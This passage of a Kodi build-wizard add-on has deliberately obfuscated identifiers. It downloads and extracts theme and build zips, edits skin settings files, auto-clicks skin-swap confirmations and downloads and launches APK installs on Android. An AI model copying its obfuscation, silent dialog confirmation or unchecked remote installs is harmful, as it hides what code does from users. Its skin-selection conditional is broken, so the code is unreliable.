				O0OOO0OOOO0000O0O =O0OO0OO0OOOO00000 .read ()#line:3787
				O0O0O0O000O00OO00 =''#line:3788
				for OO0O00O0O00OO0OO0 in OOOO0OOOOOOOOO0OO :#line:3789
				  O0O0O0O000O00OO00 ='key: '+O0O0O0O000O00OO00 +'\n'+OO0O00O0O00OO0OO0 #line:3790
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOO0000OO00O000O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0O0O0O000O00OO00 )#line:3791
		else :#line:3792
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3793
	elif OO000O0O0O0O0OOOO =='theme':#line:3794
		if theme ==None :#line:3795
			O000O0O00OO00OOOO =wiz .checkBuild (O00OOOO0OOOO0O00O ,'theme')#line:3796
			O0000O00O0O000000 =[]#line:3797
			if not O000O0O00OO00OOOO =='http://'and wiz .workingURL (O000O0O00OO00OOOO )==True :#line:3798
				O0000O00O0O000000 =wiz .themeCount (O00OOOO0OOOO0O00O ,False )#line:3799
				if len (O0000O00O0O000000 )>0 :#line:3800
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O ,COLOR1 ,len (O0000O00O0O000000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3801
						wiz .log ("Theme List: %s "%str (O0000O00O0O000000 ))#line:3802
						OOO000OOO0O0O000O =DIALOG .select (ADDONTITLE ,O0000O00O0O000000 )#line:3803
						wiz .log ("Theme install selected: %s"%OOO000OOO0O0O000O )#line:3804
						if not OOO000OOO0O0O000O ==-1 :theme =O0000O00O0O000000 [OOO000OOO0O0O000O ];O000O00OO0OOO00O0 =True #line:3805
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3806
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3807
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3808
		else :O000O00OO0OOO00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00OOOO0OOOO0O00O ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3809
		if O000O00OO0OOO00O0 :#line:3810
			OO00O0O0O00OO0O00 =wiz .checkTheme (O00OOOO0OOOO0O00O ,theme ,'url')#line:3811
			O0OO0O000O00O0O00 =O00OOOO0OOOO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3812
			if not wiz .workingURL (OO00O0O0O00OO0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3813
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3814
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3815
			OO000O00O00000OOO =os .path .join (PACKAGES ,'%s.zip'%O0OO0O000O00O0O00 )#line:3816
			try :os .remove (OO000O00O00000OOO )#line:3817
			except :pass #line:3818
			downloader .download (OO00O0O0O00OO0O00 ,OO000O00O00000OOO ,DP )#line:3819
			xbmc .sleep (1000 )#line:3820
			DP .update (0 ,"","Installing %s "%O00OOOO0OOOO0O00O )#line:3821
			O00O00OOOOOO00OO0 =False #line:3822
			if url not in ["fresh","normal"]:#line:3823
				O00O00OOOOOO00OO0 =testTheme (OO000O00O00000OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3824
				O00O00OO00OOO0OO0 =testGui (OO000O00O00000OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3825
				if O00O00OOOOOO00OO0 ==True :#line:3826
					wiz .lookandFeelData ('save')#line:3827
					O0O00O00OO0OOOOOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3828
					O0OO0OO0O0OOOO0O0 =xbmc .getSkinDir ()#line:3829
					skinSwitch .swapSkins (O0O00O00OO0OOOOOO )#line:3831
					O0O0OOO000O0O0OO0 =0 #line:3832
					xbmc .sleep (1000 )#line:3833
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOO000O0O0OO0 <150 :#line:3834
						O0O0OOO000O0O0OO0 +=1 #line:3835
						xbmc .sleep (1000 )#line:3836
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3837
						wiz .ebi ('SendClick(11)')#line:3838
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3839
					xbmc .sleep (1000 )#line:3840
			OO0OOOOO0OO0O0O0O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3841
			DP .update (0 ,OO0OOOOO0OO0O0O0O ,'','אנא המתן')#line:3842
			O0O0O00OOOO0OO000 ,O0000OOOOO0OOOOOO ,OOO0000OO00O000O0 =extract .all (OO000O00O00000OOO ,HOME ,DP ,title =OO0OOOOO0OO0O0O0O )#line:3843
			wiz .setS ('buildtheme',theme )#line:3844
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O0O00OOOO0OO000 ,O0000OOOOO0OOOOOO ))#line:3845
			DP .close ()#line:3846
			if url not in ["fresh","normal"]:#line:3847
				wiz .forceUpdate ()#line:3848
				if KODIV >=17 :wiz .kodi17Fix ()#line:3849
				if O00O00OO00OOO0OO0 ==True :#line:3850
					wiz .lookandFeelData ('save')#line:3851
					wiz .defaultSkin ()#line:3852
					O0OO0OO0O0OOOO0O0 =wiz .getS ('defaultskin')#line:3853
					skinSwitch .swapSkins (O0OO0OO0O0OOOO0O0 )#line:3854
					O0O0OOO000O0O0OO0 =0 #line:3855
					xbmc .sleep (1000 )#line:3856
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOO000O0O0OO0 <150 :#line:3857
						O0O0OOO000O0O0OO0 +=1 #line:3858
						xbmc .sleep (1000 )#line:3859
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3861
						wiz .ebi ('SendClick(11)')#line:3862
					wiz .lookandFeelData ('restore')#line:3863
				elif O00O00OOOOOO00OO0 ==True :#line:3864
					skinSwitch .swapSkins (O0OO0OO0O0OOOO0O0 )#line:3865
					O0O0OOO000O0O0OO0 =0 #line:3866
					xbmc .sleep (1000 )#line:3867
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOO000O0O0OO0 <150 :#line:3868
						O0O0OOO000O0O0OO0 +=1 #line:3869
						xbmc .sleep (1000 )#line:3870
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3872
						wiz .ebi ('SendClick(11)')#line:3873
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3874
					wiz .lookandFeelData ('restore')#line:3875
				else :#line:3876
					wiz .ebi ("ReloadSkin()")#line:3877
					xbmc .sleep (1000 )#line:3878
					wiz .ebi ("Container.Refresh")#line:3879
		else :#line:3880
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3881
def skin_homeselect ():#line:3885
	try :#line:3887
		OO0O0000O0O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3888
		O000OOO0OOOOO0O00 =open (OO0O0000O0O0O00O0 ,'r')#line:3890
		OO00O0O0O0O0OOO0O =O000OOO0OOOOO0O00 .read ()#line:3891
		O000OOO0OOOOO0O00 .close ()#line:3892
		O00000000000O000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:3893
		O00O0OO000000OOOO =re .compile (O00000000000O000O ).findall (OO00O0O0O0O0OOO0O )[0 ]#line:3894
		O000OOO0OOOOO0O00 =open (OO0O0000O0O0O00O0 ,'w')#line:3895
		O000OOO0OOOOO0O00 .write (OO00O0O0O0O0OOO0O .replace ('<setting id="HomeS" type="string%s/setting>'%O00O0OO000000OOOO ,'<setting id="HomeS" type="string"></setting>'))#line:3896
		O000OOO0OOOOO0O00 .close ()#line:3897
	except :#line:3898
		pass #line:3899
def skin_lower ():#line:3902
	O000000000OOOO0O0 =(ADDON .getSetting ("lower"))#line:3903
	if O000000000OOOO0O0 =='true':#line:3904
		try :#line:3907
			O0O0OOO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3908
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'r')#line:3910
			O00OOO0OO0O0OOOOO =O0O000OOOOO00OOO0 .read ()#line:3911
			O0O000OOOOO00OOO0 .close ()#line:3912
			O00O0OO00O0OOOO0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3913
			O000OO000O00O0OOO =re .compile (O00O0OO00O0OOOO0O ).findall (O00OOO0OO0O0OOOOO )[0 ]#line:3914
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'w')#line:3915
			O0O000OOOOO00OOO0 .write (O00OOO0OO0O0OOOOO .replace ('<setting id="none_widget" type="bool%s/setting>'%O000OO000O00O0OOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:3916
			O0O000OOOOO00OOO0 .close ()#line:3917
			O0O0OOO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3919
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'r')#line:3921
			O00OOO0OO0O0OOOOO =O0O000OOOOO00OOO0 .read ()#line:3922
			O0O000OOOOO00OOO0 .close ()#line:3923
			O00O0OO00O0OOOO0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3924
			O000OO000O00O0OOO =re .compile (O00O0OO00O0OOOO0O ).findall (O00OOO0OO0O0OOOOO )[0 ]#line:3925
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'w')#line:3926
			O0O000OOOOO00OOO0 .write (O00OOO0OO0O0OOOOO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O000OO000O00O0OOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3927
			O0O000OOOOO00OOO0 .close ()#line:3928
			O0O0OOO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3930
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'r')#line:3932
			O00OOO0OO0O0OOOOO =O0O000OOOOO00OOO0 .read ()#line:3933
			O0O000OOOOO00OOO0 .close ()#line:3934
			O00O0OO00O0OOOO0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3935
			O000OO000O00O0OOO =re .compile (O00O0OO00O0OOOO0O ).findall (O00OOO0OO0O0OOOOO )[0 ]#line:3936
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'w')#line:3937
			O0O000OOOOO00OOO0 .write (O00OOO0OO0O0OOOOO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O000OO000O00O0OOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:3938
			O0O000OOOOO00OOO0 .close ()#line:3939
			O0O0OOO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3943
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'r')#line:3945
			O00OOO0OO0O0OOOOO =O0O000OOOOO00OOO0 .read ()#line:3946
			O0O000OOOOO00OOO0 .close ()#line:3947
			O00O0OO00O0OOOO0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:3948
			O000OO000O00O0OOO =re .compile (O00O0OO00O0OOOO0O ).findall (O00OOO0OO0O0OOOOO )[0 ]#line:3949
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'w')#line:3950
			O0O000OOOOO00OOO0 .write (O00OOO0OO0O0OOOOO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O000OO000O00O0OOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:3951
			O0O000OOOOO00OOO0 .close ()#line:3952
			O0O0OOO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3956
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'r')#line:3958
			O00OOO0OO0O0OOOOO =O0O000OOOOO00OOO0 .read ()#line:3959
			O0O000OOOOO00OOO0 .close ()#line:3960
			O00O0OO00O0OOOO0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:3961
			O000OO000O00O0OOO =re .compile (O00O0OO00O0OOOO0O ).findall (O00OOO0OO0O0OOOOO )[0 ]#line:3962
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'w')#line:3963
			O0O000OOOOO00OOO0 .write (O00OOO0OO0O0OOOOO .replace ('<setting id="show.cdart" type="bool%s/setting>'%O000OO000O00O0OOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:3964
			O0O000OOOOO00OOO0 .close ()#line:3965
			O0O0OOO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3969
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'r')#line:3971
			O00OOO0OO0O0OOOOO =O0O000OOOOO00OOO0 .read ()#line:3972
			O0O000OOOOO00OOO0 .close ()#line:3973
			O00O0OO00O0OOOO0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:3974
			O000OO000O00O0OOO =re .compile (O00O0OO00O0OOOO0O ).findall (O00OOO0OO0O0OOOOO )[0 ]#line:3975
			O0O000OOOOO00OOO0 =open (O0O0OOO0OO0OOO000 ,'w')#line:3976
			O0O000OOOOO00OOO0 .write (O00OOO0OO0O0OOOOO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O000OO000O00O0OOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:3977
			O0O000OOOOO00OOO0 .close ()#line:3978
		except :#line:3983
			pass #line:3984
def thirdPartyInstall (O00000000000O0OO0 ,O0OO000OO0OOO00O0 ):#line:3986
	if not wiz .workingURL (O0OO000OO0OOO00O0 ):#line:3987
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:3988
	O0O00OO000000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000000000O0OO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:3989
	if O0O00OO000000O0O0 ==1 :#line:3990
		freshStart ('third',True )#line:3991
	wiz .clearS ('build')#line:3992
	OO00O0OO00O000OO0 =O00000000000O0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3993
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3994
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000000O0OO0 ),'','אנא המתן')#line:3995
	OO00OOOOO000OO00O =os .path .join (PACKAGES ,'%s.zip'%OO00O0OO00O000OO0 )#line:3996
	try :os .remove (OO00OOOOO000OO00O )#line:3997
	except :pass #line:3998
	downloader .download (O0OO000OO0OOO00O0 ,OO00OOOOO000OO00O ,DP )#line:3999
	xbmc .sleep (1000 )#line:4000
	OO0OOOOOOO0000O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000000O0OO0 )#line:4001
	DP .update (0 ,OO0OOOOOOO0000O00 ,'','אנא המתן')#line:4002
	OOOO00000O0O0OOOO ,O0OO0OO0OOOOOO00O ,O0OOOOOO0O0OO0OO0 =extract .all (OO00OOOOO000OO00O ,HOME ,DP ,title =OO0OOOOOOO0000O00 )#line:4003
	if int (float (OOOO00000O0O0OOOO ))>0 :#line:4004
		wiz .fixmetas ()#line:4005
		wiz .lookandFeelData ('save')#line:4006
		wiz .defaultSkin ()#line:4007
		wiz .setS ('installed','true')#line:4009
		wiz .setS ('extract',str (OOOO00000O0O0OOOO ))#line:4010
		wiz .setS ('errors',str (O0OO0OO0OOOOOO00O ))#line:4011
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO00000O0O0OOOO ,O0OO0OO0OOOOOO00O ))#line:4012
		try :os .remove (OO00OOOOO000OO00O )#line:4013
		except :pass #line:4014
		if int (float (O0OO0OO0OOOOOO00O ))>0 :#line:4015
			OOO0O00O0O0OO000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000000O0OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO00000O0O0OOOO ,'%',COLOR1 ,O0OO0OO0OOOOOO00O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4016
			if OOO0O00O0O0OO000O :#line:4017
				if isinstance (O0OO0OO0OOOOOO00O ,unicode ):#line:4018
					O0OOOOOO0O0OO0OO0 =O0OOOOOO0O0OO0OO0 .encode ('utf-8')#line:4019
				wiz .TextBox (ADDONTITLE ,O0OOOOOO0O0OO0OO0 )#line:4020
	DP .close ()#line:4021
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4022
	if INSTALLMETHOD ==1 :O0OO00O00OOOOO000 =1 #line:4023
	elif INSTALLMETHOD ==2 :O0OO00O00OOOOO000 =0 #line:4024
	else :O0OO00O00OOOOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4025
	if O0OO00O00OOOOO000 ==1 :wiz .reloadFix ()#line:4026
	else :wiz .killxbmc (True )#line:4027
def testTheme (O00O0O000O00OO0O0 ):#line:4029
	OO0000O0000O00O0O =zipfile .ZipFile (O00O0O000O00OO0O0 )#line:4030
	for OOO00O00OOOOOOOOO in OO0000O0000O00O0O .infolist ():#line:4031
		if '/settings.xml'in OOO00O00OOOOOOOOO .filename :#line:4032
			return True #line:4033
	return False #line:4034
def testGui (OOOO0O0O00O000000 ):#line:4036
	O0OOO0000O0O00OO0 =zipfile .ZipFile (OOOO0O0O00O000000 )#line:4037
	for OO0OOO0O000OOOOOO in O0OOO0000O0O00OO0 .infolist ():#line:4038
		if '/guisettings.xml'in OO0OOO0O000OOOOOO .filename :#line:4039
			return True #line:4040
	return False #line:4041
def apkInstaller (OOOO00O00OO0OO000 ,OOOOO0O00OOOO00OO ):#line:4043
	wiz .log (OOOO00O00OO0OO000 )#line:4044
	wiz .log (OOOOO0O00OOOO00OO )#line:4045
	if wiz .platform ()=='android':#line:4046
		OOOO000O0O0OO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00O00OO0OO000 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4047
		if not OOOO000O0O0OO0O0O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4048
		OOO0O0OO000OOO0OO =OOOO00O00OO0OO000 #line:4049
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4050
		if not wiz .workingURL (OOOOO0O00OOOO00OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4051
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0OO000OOO0OO ),'','אנא המתן')#line:4052
		O0O000O0O0O0O00O0 =os .path .join (PACKAGES ,"%s.apk"%OOOO00O00OO0OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4053
		try :os .remove (O0O000O0O0O0O00O0 )#line:4054
		except :pass #line:4055
		downloader .download (OOOOO0O00OOOO00OO ,O0O000O0O0O0O00O0 ,DP )#line:4056
		xbmc .sleep (100 )#line:4057
		DP .close ()#line:4058
		notify .apkInstaller (OOOO00O00OO0OO000 )#line:4059
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0O000O0O0O0O00O0 +'")')#line:4060
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4061
def createMenu (OOO0000OOO00000O0 ,O000000OOOOO00O0O ,O0O0OO0OO00OO0O00 ):#line:4067
	if OOO0000OOO00000O0 =='saveaddon':#line:4068
		O00000000000OO000 =[]#line:4069
		O00OOOOOOOOO0O0OO =urllib .quote_plus (O000000OOOOO00O0O .lower ().replace (' ',''))#line:4070
		O0OOOO000OOO0O000 =O000000OOOOO00O0O .replace ('Debrid','Real Debrid')#line:4071
		O0000O0OOO000000O =urllib .quote_plus (O0O0OO0OO00OO0O00 .lower ().replace (' ',''))#line:4072
		O0O0OO0OO00OO0O00 =O0O0OO0OO00OO0O00 .replace ('url','URL Resolver')#line:4073
		O00000000000OO000 .append ((THEME2 %O0O0OO0OO00OO0O00 .title (),' '))#line:4074
		O00000000000OO000 .append ((THEME3 %'Save %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4075
		O00000000000OO000 .append ((THEME3 %'Restore %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4076
		O00000000000OO000 .append ((THEME3 %'Clear %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4077
	elif OOO0000OOO00000O0 =='save':#line:4078
		O00000000000OO000 =[]#line:4079
		O00OOOOOOOOO0O0OO =urllib .quote_plus (O000000OOOOO00O0O .lower ().replace (' ',''))#line:4080
		O0OOOO000OOO0O000 =O000000OOOOO00O0O .replace ('Debrid','Real Debrid')#line:4081
		O0000O0OOO000000O =urllib .quote_plus (O0O0OO0OO00OO0O00 .lower ().replace (' ',''))#line:4082
		O0O0OO0OO00OO0O00 =O0O0OO0OO00OO0O00 .replace ('url','URL Resolver')#line:4083
		O00000000000OO000 .append ((THEME2 %O0O0OO0OO00OO0O00 .title (),' '))#line:4084
		O00000000000OO000 .append ((THEME3 %'Register %s'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4085
		O00000000000OO000 .append ((THEME3 %'Save %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4086
		O00000000000OO000 .append ((THEME3 %'Restore %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4087
		O00000000000OO000 .append ((THEME3 %'Import %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4088
		O00000000000OO000 .append ((THEME3 %'Clear Addon %s Data'%O0OOOO000OOO0O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00OOOOOOOOO0O0OO ,O0000O0OOO000000O )))#line:4089
	elif OOO0000OOO00000O0 =='install':#line:4090
		O00000000000OO000 =[]#line:4091
		O0000O0OOO000000O =urllib .quote_plus (O0O0OO0OO00OO0O00 )#line:4092
		O00000000000OO000 .append ((THEME2 %O0O0OO0OO00OO0O00 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0000O0OOO000000O )))#line:4093
		O00000000000OO000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0000O0OOO000000O )))#line:4094
		O00000000000OO000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0000O0OOO000000O )))#line:4095
		O00000000000OO000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0000O0OOO000000O )))#line:4096
		O00000000000OO000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0000O0OOO000000O )))#line:4097
	O00000000000OO000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4098
	return O00000000000OO000 #line:4099
def toggleCache (OO00OOOO00O0O0O00 ):#line:4101
	O0OOO0O0000OOO0O0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4102
	O00OO0OO0O0O0OO00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4103
	if OO00OOOO00O0O0O00 in ['true','false']:#line:4104
		for O000OO0OOOO0OOOOO in O0OOO0O0000OOO0O0 :#line:4105
			wiz .setS (O000OO0OOOO0OOOOO ,OO00OOOO00O0O0O00 )#line:4106
	else :#line:4107
		if not OO00OOOO00O0O0O00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4108
			try :#line:4109
				O000OO0OOOO0OOOOO =O00OO0OO0O0O0OO00 [O0OOO0O0000OOO0O0 .index (OO00OOOO00O0O0O00 )]#line:4110
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O000OO0OOOO0OOOOO ))#line:4111
			except :#line:4112
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO00OOOO00O0O0O00 ))#line:4113
		else :#line:4114
			O0000OO0000O000OO ='true'if wiz .getS (OO00OOOO00O0O0O00 )=='false'else 'false'#line:4115
